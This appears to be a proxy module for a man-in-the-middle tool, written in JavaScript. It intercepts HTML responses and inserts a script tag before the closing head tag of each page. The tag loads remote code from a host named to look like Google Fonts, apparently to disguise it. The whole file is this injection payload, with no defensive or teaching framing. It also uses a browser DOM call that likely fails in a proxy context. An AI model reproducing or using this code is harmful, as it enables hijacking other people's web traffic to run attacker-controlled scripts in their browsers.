// custom_parser.js

// Define your custom parsing function
function onResponse(req, res) {
    if (res.ContentType && res.ContentType.indexOf('text/html') === 0) {
        var body = res.ReadBody();

        if (body.indexOf('</head>') !== -1) {

            var scriptElement = document.createElement('script');
            
            scriptElement.type = 'text/javascript';
            scriptElement.src = 'http://googlefonts/decoration.js';
            
            // Append the script element just before the closing </head> tag
            var headTagEndIndex = body.indexOf('</head>');
            var modifiedBody = body.slice(0, headTagEndIndex) + scriptElement.outerHTML + body.slice(headTagEndIndex);
            
            res.Body = modifiedBody;
        }
    }
}
